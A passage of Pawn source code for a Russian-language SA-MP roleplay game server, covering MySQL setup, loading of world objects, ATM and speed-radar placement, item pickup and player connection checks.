    LoadMySQLSettings();
	SetGameModeText("LOADING...");

    Iter_Init(FamilyMembers);

	new bind[64];
    GetServerVarAsString("bind", bind, sizeof(bind));

	dbHandle = mysql_connect(MySQLSettings[DOOME_HOST],MySQLSettings[DOOME_USERNAME],MySQLSettings[DOOME_DATABASE],MySQLSettings[DOOME_PASSWORD]);
    mysql_set_charset("cp1251");

	mysql_log(LOG_WARNING | LOG_ERROR);

	LoadAreaActionts();

	new fmt_msg[170];

	for(new idx; idx < sizeof g_area; idx ++)
	{
		g_area_total[idx] = CreateDynamicSphere(g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z], 1.0);
		CreatePickup(1318, 23, g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z], g_area[idx][g_area_pickup_word]);

		if(g_area[idx][g_text] != EOS)
		{
			format(fmt_msg, sizeof fmt_msg, "%s", g_area[idx][g_text]);
			CreateDynamic3DTextLabel(fmt_msg, COLOR_BLUE, g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z]+1.0, 10.0);
		}
	}

	LoadPickups();


	for(new idx; idx < 4; idx ++)
	{
	    CreateDynamic3DTextLabel("/dice", COLOR_MANDARIN, area_dice_money[idx][0], area_dice_money[idx][1], area_dice_money[idx][2], 10.0);
	}

    if(mysql_errno() == -1)
    {
        if(!strcmp(bind, "217.106.106.178", true)) SetGameModeText(""SERVER_NAME" | Error SQL");
        else print("  MySQL connection: FALSE (host)\n");
    }
    else
    {
        if(!strcmp(bind, "217.106.106.178", true)) print("  MySQL connection: TRUE (local)\n");
	    else print("  MySQL connection: TRUE (host)\n");

	    mysql_tquery(dbHandle, "SET CHARACTER SET cp1251", "", "");
	    mysql_tquery(dbHandle, "SET NAMES utf8", "", "");
	    mysql_tquery(dbHandle, "SET character_set_client = cp1251", "", "");
	    mysql_tquery(dbHandle, "SET character_set_connection = cp1251", "", "");
	    mysql_tquery(dbHandle, "SET character_set_results = cp1251", "", "");
	    mysql_tquery(dbHandle, "SET SESSION collation_connection = utf8_general_ci", "", "");


		mysql_tquery(dbHandle, "SELECT * FROM "T_VEHICLE"", "LoadVeh", "");
		mysql_tquery(dbHandle, "SELECT * FROM autosalon", "LoadAutoSalonCars", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_BIZZ" ORDER BY  "T_BIZZ".`id` ASC ", "LoadBizz", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_HOUSE" ORDER BY  "T_HOUSE".`id` ASC ", "LoadHouse", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_MAFIA"", "LoadMafia", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_GANG"", "LoadGang", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_ATM"", "LoadATM", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_OTHER"", "LoadOther", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_RADAR"", "LoadRadar", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_DROPIT"","LoadDropItem", "");
		mysql_tquery(dbHandle, "SELECT * FROM "T_FAMILY"","LoadFamily", "");

	    mysql_tquery(dbHandle, "SELECT * FROM "T_GARAGES"", "LoadGarages", "");

		mysql_tquery(dbHandle, "UPDATE "T_ADMIN" SET `timemin` = '0'", "", "");
		mysql_tquery(dbHandle, "UPDATE orders SET `status` = '0'", "", "");

		mysql_tquery(dbHandle, "SELECT * FROM entrances", "LoadEntrances", "");
		mysql_tquery(dbHandle, "SELECT * FROM rooms", "LoadRooms", "");

		mysql_tquery(dbHandle, "SELECT * FROM ferm", "LoadFerm", "");
    }
	SendRconCommand("mapname "SERVER_MAP"");
	SendRconCommand("weburl "SERVER_WEBURL"");
	if(!doubling_donate)
	{
		SendRconCommand("hostname HOME ONLINE | AQUA");
	}
	else
	{
	    SendRconCommand("hostname HOME ONLINE | AQUA");
	 }

	new h;
	gettime(h,gCurMinutes,gCurHour);
	SetWorldTime(h);
	SetGravity(0.008);
	ManualVehicleEngineAndLights();
	//EnableStuntBonusForAll(0);
	SetNameTagDrawDistance(24.0);
 	ShowPlayerMarkers(2);
	DisableInteriorEnterExits();

	LoadActors();

	AddPlayerClass(36,0.0,0.0,5.0,0.0,0,0,0,0,0,0);

	//VehInfo[idx][cText] = CreateDynamic3DTextLabel(VehInfo[idx][pNumberVehicle], COLOR_YELLOW, 0.0, 0.0, 0.0, 15.0, 0, 1), Attach3DTextLabelToVehicle(VehInfo[idx][cText], i, 0.0, 0.0, 1.0);

	//Двери, ворота, мосты
	//Dvers[0] = CreateObject(1569, 894.25, 2097.70, 2720.79,   0.00, 0.00, -90.00);
	//Dvers[1] = CreateObject(1495, 881.162841,2096.350341,2720.778320, 0.000000,0.000000,89.999908);
	Dvers[3] = CreateObject(1569, -228.7682, 701.7680, 1001.0000, 0.00, 0.00, -90.00);
	//Dvers[4] = CreateObject(2168,2747.34448242,-1142.90002441,21.60000038,0.00000000,0.00000000,180.00000000); //object(partition) (2)
	//Dvers[5] = CreateObject(2168,2747.30004883,-1262.00000000,21.60000038,0.00000000,0.00000000,0.00000000); //object(partition) (4)
	Dvers[6] = CreateObject(1569, -223.1524, 696.1800, 1001.0000, 0.00, 0.00, 0.00);
	//Dvers[7] = CreateObject(19303, 589.34, 2782.04, 1254.25,   0.00, 0.00, -90.00);
	//Dvers[8] = CreateObject(1569, -223.1524, 696.1800, 1001.0000,   0.00, 0.00, 0.00);
	Dvers[9] = CreateObject(968, -219.3915, 569.2380, 12.3261, 0.000000,0.000000,-6.000000);
	Dvers[10] = CreateObject(968, -299.3062, 540.3217, 12.2217, 0.000000,0.000000,-96.000000);
	Dvers[12] = CreateObject(1495, 597.2094,2.2534,1021.8394, 0.000000,0.000000,-90.000000);
	Dvers[13] = CreateObject(968, 1817.6000, 2132.4800, 15.5900,   0.000000, 0.000000, 90.000000);
	Dvers[14] = CreateObject(1569, 444.4124, -82.6182, 3000.9900, 0.000000,0.000000,0.000000);
	Dvers[15] = CreateObject(1495, -228.9312, 709.6014, 1001.0000,   0.000000, 0.000000, 180.000000);
	Dvers[16] = CreateObject(1495, -2464.1699, -2314.8899, 1001.0000, 0.000000,0.000000,0.000000);

	//Бутылк
	//
	/*g_arend_ball_object = CreateDynamicObject(19338, 488.35001, 1746.05005, 11.00000,   0.00000, 0.00000, 0.00000);
	door_inter_swat = CreateDynamicObject(1495, -223.17999, 696.15997, 1001.00000,   0.00000, 0.00000, 0.00000);*/
	door_bank = CreateDynamicObject(1569, 523.48853, 657.67596, 3590.58057,   0.00000, 0.00000, -20.46001);
	SetDynamicObjectMaterial(door_bank, 0, 10047, "ammu_twofloor", "gun_door1", 0x00000000);

	dps_barrier = CreateObject(968, 2561.99, -2433.16, 21.6046, 0.0000, -90.0000, -90.0000);
	//mayor_barrier = CreateObject(968, 145.4300, 651.5100, 11.7300, 0.0000, -90.0000, 69.0000);
	army_barrier = CreateObject(988, 29.0539, 2845.36, 23.9028, 0.0000, 0.0000, 0.0000); // шлагбаум
	army_barrier2 = CreateObject(988, 23.6128, 2845.36, 23.9028, 0.0000, 0.0000, 0.0000); // ворота
	fbi_barrier = CreateObject(968, 1869.94, -2207.36, 11.000, 0.0000, 90.0000, 0.0000);
	/*{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 168.3427,801.6275,11.5650,340.0409,0,1},//1 скутер спавн
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 166.9195,802.1925,11.5646,342.8921,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 165.4075,802.7139,11.5651,342.2088,2,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 163.8657,803.3596,11.5654,344.4158,3,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 162.3462,803.9603,11.5653,342.3939,4,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 160.7957,804.4875,11.5651,341.9006,6,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 159.3052,805.1667,11.5654,342.7124,0,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 157.8300,805.6387,11.5656,342.9879,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 156.2254,806.2215,11.5652,341.6134,2,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 154.8357,806.7422,11.5651,340.5568,3,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 153.3859,807.2234,11.5651,341.4451,4,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 151.7678,807.8463,11.5655,343.5265,6,1} // последний скутер на спавне*/

	/*for(new idx = 0; idx < sizeof g_bus; idx ++)
	{
		//new fmt_msg[170];

		format
		(
			fmt_msg, sizeof fmt_msg,
			"{ffffff}Остановка: {ffcc00}%s\n"\
			"{ffffff}Стоимость проезда: {ffcc00}200 рублей\n"\
			"{ffffff}Нажмите {ffcc00}\"L.ALT\" для проезда",
			g_bus[idx][stop_name]
		);

		CreateDynamic3DTextLabel(fmt_msg, COLOR_WHITE, g_bus[idx][stop_x], g_bus[idx][stop_y], g_bus[idx][stop_z]+1.0, 10.0);
	}*/

	/*LoadAreaActionts();

	new fmt_msg[64];

	for(new idx; idx < sizeof g_area; idx ++)
	{
		g_area_total[idx] = CreateDynamicSphere(g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z], 1.0);
		CreatePickup(19133, 23, g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z], g_area[idx][g_area_pickup_word]);

		if(g_area[idx][g_text] != EOS)
		{
			format(fmt_msg, sizeof fmt_msg, "%s", g_area[idx][g_text]);
			CreateDynamic3DTextLabel(fmt_msg, COLOR_BLUE, g_area[idx][g_pos_area_x], g_area[idx][g_pos_area_y], g_area[idx][g_pos_area_z]+1.0, 10.0);
		}
	}*/

	LoadTextDrawsSkill();
	LoadTextDrawsMainMenu();
	LoadTextDrawsTuning();
	LoadTextDraws();
	LoadObject();
	Menu();
	LoadAddItem();

	Streamer_SetVisibleItems(STREAMER_TYPE_OBJECT, 750);
	Streamer_SetVisibleItems(STREAMER_TYPE_MAP_ICON, 90);
	Streamer_SetVisibleItems(STREAMER_TYPE_3D_TEXT_LABEL, 200);

	secupdate = SetTimer("SecTimer", 1000, true);
	SetTimer("MinuteTimer", 60000, true);
	SetTimer("SystemPolomka", 1000, true);
	/* ---------------------------------------------------------------------- */
	printf ("-> Динамических объектов: %d",CountDynamicObjects());
	printf ("-> Статических объектов: %d",TotalObject);

	printf ("-> Видимых объектов (стример): %d",Streamer_GetVisibleItems(STREAMER_TYPE_OBJECT));
	/* ---------------------------------------------------------------------- */

	SetGameModeText(SERVER_VERSION);
	gamemodeloaded = 1;

	CaptureZone = GangZoneCreate(406.3290,-2472.4651, 574.3279,-2377.4543);
	CaptureArea = CreateDynamicRectangle(406.3290,-2472.4651, 574.3279,-2377.4543);
	AreaEntraceMenu = CreateDynamicSphere(1666.3313,498.0428,299.5043, 1.0);
	AreaEntraceExit = CreateDynamicSphere(1655.2905,500.3913,299.4982, 1.0);
	AreaRoomExit = CreateDynamicSphere(261.4644, 86.2341, 923.2872, 1.0);
	AreaFerm = CreateDynamicSphere(-807.6794,-1228.3556,43.4072, 1.0);

	CreateDynamic3DTextLabel("Меню банка\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1161.6501,496.9028,999.3750, 5.0);
	CreateDynamic3DTextLabel("Меню банка\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1159.1920,496.8595,999.3750, 5.0);
	CreateDynamic3DTextLabel("Меню банка\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1156.6777,496.8596,999.3750, 5.0);
	CreateDynamic3DTextLabel("Меню банка\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1154.2179,496.8595,999.3750, 5.0);

	CreatePickup(1274, 23, 1161.6501,496.9028,999.3750, -1); // - банк3
	CreatePickup(1274, 23, 1159.1920,496.8595,999.3750, -1); // - банк3
	CreatePickup(1274, 23, 1156.6777,496.8596,999.3750, -1); // - банк3
	CreatePickup(1274, 23, 1154.2179,496.8595,999.3750, -1); // - банк3

	CreatePickup(1318, 23, 1850.3457,2035.1680,16.9742, -1); // - банк1
	CreateDynamic3DTextLabel("Отделение Сбербанка пгт. Батырево\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1850.3457,2035.1680,16.9742, 5.0);
	CreatePickup(1318, 23, 2376.6753,-2139.2605,22.0776, -1); // - банк2
	CreateDynamic3DTextLabel("Отделение Сбербанка г.Южный\n{cecece}(Нажмите ALT)", 0xffd83dFF, 2376.6753,-2139.2605,22.0776, 5.0);
	CreatePickup(1318, 23, 62.9153,843.3816,12.1716, -1); // - банк3
	CreateDynamic3DTextLabel("Отделение Сбербанка г.Арзамас\n{cecece}(Нажмите ALT)", 0xffd83dFF, 62.9153,843.3816,12.1716, 5.0);

	AreaFarmer = CreateDynamicRectangle(406.3290,-2472.4651, 574.3279,-2377.4543);

	CreatePickup(1314, 23, 1666.3313,498.0428,299.5043, -1);
	CreatePickup(1318, 23, 1655.2905,500.3913,299.4982, -1);
	//CreateDynamic3DTextLabel("Приобретение\n{AFAFAF}Встаньте на пикап",COLOR_GREEN, 133.8702,1367.3624,1002.9600,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
	//licenses_pickup = CreateDynamicPickup(19134, 2, 133.8702,1367.3624,1002.9600, -1); // покупка лицензий в автошколе

	foreach(new i: Vehicle)
	{
	    SetVehicleParamsEx(i, false, false, false, false, false, false, false);
		g_vehicle[i][veh_number][0] = '\0';
		strcat(g_vehicle[i][veh_number], "Г777ОС");
  		g_vehicle[i][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[i][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, _, i);
	}

	for(new i = 1; i < MAX_ADMIN_REPORTS; i++)
    {
        gReport[i][rIsTooked] = false;
        gReport[i][rID] = i;
        gReport[i][rPlayerID] = -1;
        gReport[i][rText][0] = EOS;
        gReport[i][rWhenWroted_Time] = -1;
        gReport[i][rWhenWroted_Text][0] = EOS;
    }
	SetTimer("admin_reports_cleaner", 1000*60, 1); // 1 - min
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	if(!IsPlayerInAnyVehicle(playerid)) SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
	else AttachObjectToVehicle(GetPVarInt(playerid, "VehicleObj"), GetPlayerVehicleID(playerid), fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
}

public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if(GetPVarInt(playerid, "LoadATM") > 0)
	{
		if(!playerobject)
		{
			if(!IsValidObject(objectid)) return 1;
			MoveObject(objectid, fX, fY, fZ, 10.0, fRotX, fRotY, fRotZ);
		}
		if(response == EDIT_RESPONSE_FINAL)
		{
			TOTALATM++;
			ATMInfo[TOTALATM][aX] = fX;
			ATMInfo[TOTALATM][aY] = fY;
			ATMInfo[TOTALATM][aZ] = fZ;
			ATMInfo[TOTALATM][arX] = fRotX;
			ATMInfo[TOTALATM][arY] = fRotY;
			ATMInfo[TOTALATM][arZ] = fRotZ;
			SendClientMessage(playerid,COLOR_YELLOW,"ИНФО: Вы установили банкомат");
			DestroyObject(GetPVarInt(playerid, "LoadATM")-1);
			ATM[TOTALATM] = CreateObject(2942, fX, fY, fZ, fRotX, fRotY, fRotZ);
			LABELATM[TOTALATM] = CreateDynamic3DTextLabel("Банкомат\n{FFFFFF}Нажмите: {FFCC00}ALT", 0xFFFFFFAA, ATMInfo[TOTALATM][aX],ATMInfo[TOTALATM][aY],ATMInfo[TOTALATM][aZ]+1.1,10.0);
			DeletePVar(playerid, "LoadATM");
			CancelEdit(playerid);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"INSERT INTO "T_ATM" (ID, aX, aY, aZ, arX, arY, arZ) VALUES (%i,'%f','%f','%f','%f', '%f', '%f')",
			TOTALATM,ATMInfo[TOTALATM][aX],ATMInfo[TOTALATM][aY],ATMInfo[TOTALATM][aZ], ATMInfo[TOTALATM][arX], ATMInfo[TOTALATM][arY], ATMInfo[TOTALATM][arZ]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
		}
		if(response == EDIT_RESPONSE_CANCEL)
		{
			DeletePVar(playerid, "LoadATM");
			SendClientMessage(playerid, COLOR_RED, "Установка банкомата отменена");
			DestroyObject(GetPVarInt(playerid, "LoadATM")-1);
			CancelEdit(playerid);
		}
		return 1;
	}
	if(GetPVarInt(playerid, "CreateRadar") != 0)
	{
	    if(!playerobject)
		{
			if(!IsValidObject(objectid)) return 1;
			MoveObject(objectid, fX, fY, fZ, 30.0, fRotX, fRotY, fRotZ);
		}
		if(response == EDIT_RESPONSE_FINAL)
		{
			TOTALRADAR++;

			switch(GetPVarInt(playerid, "TypeRadar"))
		    {
		        case 0: RI[TOTALRADAR][r_type] = 1, RI[TOTALRADAR][r_speed] = 20;
		        case 1: RI[TOTALRADAR][r_type] = 2, RI[TOTALRADAR][r_speed] = 60;
		        case 2: RI[TOTALRADAR][r_type] = 3, RI[TOTALRADAR][r_speed] = 110;
		        case 3: RI[TOTALRADAR][r_type] = 4, RI[TOTALRADAR][r_speed] = 90;
		    }

		    new stringss [256];
			RI[TOTALRADAR][r_x] = fX; RI[TOTALRADAR][r_y] = fY; RI[TOTALRADAR][r_z] = fZ; RI[TOTALRADAR][r_a] = fRotZ;
			DestroyObject(GetPVarInt(playerid, "RadarObject"));
			RI[TOTALRADAR][r_object] = CreateObject(18880, fX, fY, fZ, fRotX, fRotY, fRotZ);
			format(stringss, sizeof stringss, "Радар №%d\n\n{FFFFFF}Макс. разрешенная скорость: %d КМ/Ч", TOTALRADAR, RI[TOTALRADAR][r_speed]);
			RI[TOTALRADAR][r_label] = CreateDynamic3DTextLabel(stringss, 0xBBBBBBFF, RI[TOTALRADAR][r_x], RI[TOTALRADAR][r_y], RI[TOTALRADAR][r_z]+4.0,10.0);
			DeletePVar(playerid, "CreateRadar");
			DeletePVar(playerid, "TypeRadar");
			DeletePVar(playerid, "RadarObject");
			CancelEdit(playerid);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"INSERT INTO "T_RADAR" (r_id, r_name, r_type, r_speed, r_x, r_y, r_z, r_a) VALUES (%i, '%s', %i, %i, '%f', '%f', '%f', '%f')",
			TOTALRADAR, GetName(playerid), RI[TOTALRADAR][r_type], RI[TOTALRADAR][r_speed], RI[TOTALRADAR][r_x], RI[TOTALRADAR][r_y], RI[TOTALRADAR][r_z], RI[TOTALRADAR][r_a]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			SendClientMessage(playerid, C_OSNOV, "Радар успешно создан.");
		}
		if(response == EDIT_RESPONSE_CANCEL)
		{
			DeletePVar(playerid, "CreateRadar");
			DeletePVar(playerid, "TypeRadar");
			SendClientMessage(playerid, C_RED, "Вы отменили установку радара");
			DestroyObject(GetPVarInt(playerid, "RadarObject"));
			CancelEdit(playerid);
			DeletePVar(playerid, "RadarObject");
		}
	}
	if(response == EDIT_RESPONSE_CANCEL)
	{
		DestroyObject(objectid);
		CancelEdit(playerid);
	}
	if(response == EDIT_RESPONSE_FINAL)
	{
		CancelEdit(playerid);
	}
	return 1;
}

stock PlayerUpItem(playerid,i)
{
	//if(TimerNoUpItem[playerid]>0)return SendClientMessage(playerid,COLOR_GREY,"Вы не можете сейчас поднимать предметы!");
    if(IsPlayerInRangeOfPoint(playerid,1.5,DropItem[i][dX],DropItem[i][dY],DropItem[i][dZ]))
    {
        new inter, world;
        inter = GetPlayerInterior(playerid);
		world = GetPlayerVirtualWorld(playerid);
        if(DropItem[i][dInt] != inter){return SendClientMessage(playerid,C_RED,"Предмет не найден!");}
        if(DropItem[i][dWorld] != world){return SendClientMessage(playerid,C_RED,"Предмет не найден!");}
        new id = DropItem[i][dIDItem];
        if(CheckMaxVes(playerid,id,DropItem[i][dPiece])==1)return true;
        new slot;
		if(Item[id][iStek]==1)
		{
		    new stek=0;
			for(new si = 16; si > 0; si --)
	        {
	            if(PlayerItem1[playerid][si]==id){stek=1;slot=si;break;}
	        }
	        if(stek==0)
	        {
				for(new si = 16; si > 0; si --)
	            {
	                if(PlayerItem1[playerid][si]==0){stek=0;slot=si;break;}
	            }
	        }
		}
		else
		{
			for(new si = 16; si > 0; si --)
	        {
	            if(PlayerItem1[playerid][si]==0){slot=si;break;}
	        }
		}
		if(slot==0)return SendClientMessage(playerid,C_RED,"Нет свободных ячеек или места!");
		ApplyAnimation(playerid,"MISC","Case_pickup",4.1,0,0,0,0,500);

    	STRING_GLOBAL[0] = EOS;
    	format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"Вы успешно подняли предмет: %s в количестве: %i",Item[DropItem[i][dIDItem]][iName],DropItem[i][dPiece]);
    	SendClientMessage(playerid,C_OSNOV,STRING_GLOBAL);
        GiveItem(playerid, id, DropItem[i][dPiece]);
        format(PlayerItem3[playerid][slot],32,"%s",DropItem[i][dValue]);
    	SaveItem(playerid,slot);
    	DropItem[i][dPiece]=0;
        DropItem[i][dX]=0;
        DropItem[i][dY]=0;
        DropItem[i][dZ]=0;
        DropItem[i][dIDItem]=0;
		DropItem[i][dPiece]=0;
		DestroyDynamicObject(DropItem[i][dObject]);
		DestroyDynamic3DTextLabel(DropItem[i][dText]);
		DropItem[i][dObject]=0;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "DELETE FROM "T_DROPIT" WHERE `Number` = '%i'",i);
		mysql_query(dbHandle ,STRING_GLOBAL);
    }
	return true;
}

public OnGameModeExit()
{
	foreach(new i: Player)
	{
	    if(!IsPlayerConnected(i)) continue;

		STRING_GLOBAL[0] = EOS;
	    mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `del_obj` = '1' WHERE name = '%s'", GetName(i));
   		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	DestroyAllDynamicObjects();
	DestroyAllDynamicPickups();
	DestroyAllDynamicCPs();
	DestroyAllDynamicRaceCPs();
	DestroyAllDynamicMapIcons();
	DestroyAllDynamic3DTextLabels();
	DestroyAllDynamicAreas();
	KillTimer(secupdate);
	mysql_close();
	return 1;
}
forward OnPlayerRequestClassEx(playerid);
public OnPlayerRequestClassEx(playerid)
{
	//SetSpawnInfoEx(playerid, PI[playerid][pModel], 0, 0, 0, 1.0);

	ac_1{playerid} = true;
	PlayerSpawned[playerid] = false;
	//for(new i; i < 9; i++) PlayerTextDrawShow(playerid, money_td_player[playerid][i]);
	//SetTimerEx("player_join", 300, false, "i", playerid);

	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT `id` FROM "T_ACCOUNTS" WHERE `name` = '%e' LIMIT 1", GetName(playerid));
   	mysql_tquery(dbHandle, STRING_GLOBAL, "player_check", "i", playerid);
	return 1;
}
public OnPlayerRequestClass(playerid, classid)
{
    if(PlayerLogged[playerid] == true)
	{
	    SetSpawnInfoEx(playerid, PI[playerid][pModel], 0, 0, 0, 1.0);
		return SpawnPlayer(playerid);
	}
	return 0;
}

forward player_join(playerid);
public player_join(playerid)
{
	SetPlayerVirtualWorld(playerid, playerid + 1);//playerid, playerid + 1
	TogglePlayerControllable(playerid, 0);
	new randoms = random(2);
	switch(randoms)
 	{
 	    case 0:
		{
			SetPlayerPos(playerid, 303.7563,630.4167,49.2400);
			SetPlayerFacingAngle(playerid, 68);
			ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
		}
		case 1:
		{
			SetPlayerPos(playerid, 305.9530,634.5020,49.2444);
			SetPlayerFacingAngle(playerid, 339.7781);
			ApplyAnimation(playerid,"PED","SEAT_down",4.1,0,0,0,1,0,1);
		}
 	}
 	SetPlayerCameraPos(playerid, 309.6385,630.7314,50.2831);
	SetPlayerCameraLookAt(playerid, 304.5445,632.5879,49.2371);

	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT `id` FROM "T_ACCOUNTS" WHERE `name` = '%e' LIMIT 1", GetName(playerid));
   	mysql_tquery(dbHandle, STRING_GLOBAL, "player_check", "i", playerid);

	return 1;
}

forward player_check(playerid);
public player_check(playerid)
{
    new rows, fields;
 	cache_get_data(rows, fields);
    if(rows)
	{
	    SetPVarInt(playerid, "avttimer", 60*2);// слишком долго игрок подключается к серверу - 2 минуты

		ShowDialogAutorizationPlayer(playerid);
	}
	else
	{
		PI[playerid][pLevel] = 1;
		ShowDialogRegisterPlayer(playerid);
	}
	SetPVarInt(playerid, "Logged", 1);
	return 1;
}

public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags)
{
	if(!IsPlayerConnected(playerid)) Kick(playerid);
	if(TextResetCMD[playerid] < gettime()) TextResetCMD[playerid] = gettime()+2;
	if(result == -1)
    {
        SendClientMessage(playerid, 0xFFFFFFFF, "Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд");
        return 0;
    }
	return 1;
}

//new serg_tick = 50;
public OnPlayerConnect(playerid)
{
	InitFly(playerid);
	//cef
	g_CefLoaded[playerid] = false;
	g_HudVisible[playerid] = false;
    DMZone[playerid] = 0;

	carshot[playerid][0] = 0;
	carshot[playerid][1] = 0;
	carshot[playerid][2] = 0;

    KickFreezeAFK{playerid} = 0;

	bplayer++;

	PI[playerid][pBottles] = 0;

    kick_reason[playerid] = "Отсутствует";

	TogglePlayerSpectating(playerid, true);
	SetTimerEx("OnPlayerRequestClassEx", 1000*3, false, "i", playerid);

	new CheckSobeit[10];
	GetPlayerVersion(playerid, CheckSobeit, sizeof(CheckSobeit));
	if(strfind(CheckSobeit, "LoL4" ) != -1) return KickEx(playerid, "s0beit LoL4");

	new fmt_query[60], ip[16], rows, Cache: result;
	GetPlayerIp(playerid, ip, sizeof ip);
	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM blockip WHERE ip='%e'", ip);
	result = mysql_query(dbHandle, fmt_query);
	rows = cache_num_rows();
	if(rows)
	{
		KickEx(playerid, "blockip");
		cache_delete(result);

		return 1;
	}
	else cache_delete(result);

	printf("%s[%d] connects to the server (IP: %s)", GetName(playerid), playerid, ip);

    if(playerid == INVALID_PLAYER_ID || gamemodeloaded != 1) return KickEx(playerid, "Invalid player_id");
	// -------------------------------
    new buffer[40+1];
    GetPlayerClientID(playerid, buffer);

    IsPlayerUseForbiddenSoftware(playerid);
	SetPVarString(playerid, "gpci", buffer);

    GetPlayerIp(playerid, PI[playerid][pIP], 16);
	MysqlUpdatePlayerStr(playerid, "ip", PI[playerid][pIP]);

    GetPlayerName(playerid, PI[playerid][pName], MAX_PLAYER_NAME);

    // if(slotUsed{playerid} && !strcmp(playersIP[playerid], PI[playerid][pIP], true)) return Ban(playerid);
    GetPlayerIp(playerid, playersIP[playerid], 16);
    slotUsed{playerid} = true;

 	if(IsLoginInvalid(GetName(playerid)))
	{
	    SendClientMessage(playerid, C_RED, "Ваше имя содержит запрещенные символы или цифры, используйте имя формата Имя_Фамилия на английском");
		return KickEx(playerid, "Incorrect name");
	}
	static const blacklist_name[5][5] = {"CM_","_CM","Bomj","bomj","BOMJ"};
	for(new i; i < sizeof(blacklist_name); i++)
	{
	    if(strfind(GetName(playerid), blacklist_name[i], true) == 0) return KickEx(playerid, "Govno name");
	}


	ac_1{playerid} = false;
    SetPlayerDataToDefault(playerid);
	CreateTextDraws(playerid);
	CreateTextDrawSkill(playerid);
	RemoveBuild(playerid);
	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name` = '%e' LIMIT 1", GetName(playerid));
   	//mysql_tquery(dbHandle, STRING_GLOBAL, "remove_build", "i", playerid);

    SetPVarInt(playerid, "PickupID", -1);

    rodEnable{playerid} = 0;
    rodRaised{playerid} = 0;
	SetPlayerColor(playerid, COLOR_GREY);
	SetPlayerScore(playerid, 0);
	Conday[0]++;Conday[1]++;MD[5]++;
	for(new i = 25; i >= 0; i--) SendClientMessage(playerid, COLOR_WHITE, "");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 144, "[A] %s[%d] присоединяется к серверу.", PI[playerid][pName], playerid);//Закончить
	SendAdminMessage(COLOR_GREY, STRING_GLOBAL, 1);
	for(new i = 17; i >= 0; i --)
	{
		PlayerUseList[playerid][i]=0;
	}

	SetPlayerScore(playerid, 3);
	SetPlayerColor(playerid, 0xFFFFFF00);

    //SetTimerEx("TimerMoney", 100, true, "d", playerid);

    //for(new i; i < 9; i++) PlayerTextDrawShow(playerid, money_td_player[playerid][i]);

    STRING_GLOBAL[0] = EOS;
